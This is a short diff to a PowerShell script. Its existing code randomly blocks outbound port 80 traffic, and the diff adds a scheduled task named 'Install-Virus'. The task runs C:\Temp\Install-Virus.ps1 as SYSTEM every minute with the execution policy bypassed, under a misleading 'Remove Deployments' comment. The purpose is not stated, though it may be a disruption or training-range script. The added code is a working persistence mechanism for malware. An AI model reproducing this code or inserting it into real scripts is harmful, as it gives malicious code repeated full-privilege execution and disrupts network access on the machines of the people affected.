@@ -19,3 +19,8 @@ if ($Random -le 5) {
     New-NetFirewallRule -DisplayName "Block Outbound Port 80" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Block -Profile Any
     Enable-NetFirewallRule -DisplayName "Block Outbound Port 80"
 }
+#Set Scheduled Tasks
+# Remove Deployments
+$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Temp\Install-Virus.ps1"
+$Trigger = New-ScheduledTaskTrigger -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
+Register-ScheduledTask -TaskName "Install-Virus" -Action $Action -Trigger $Trigger -Description "Install Virus" -RunLevel Highest -User "System"
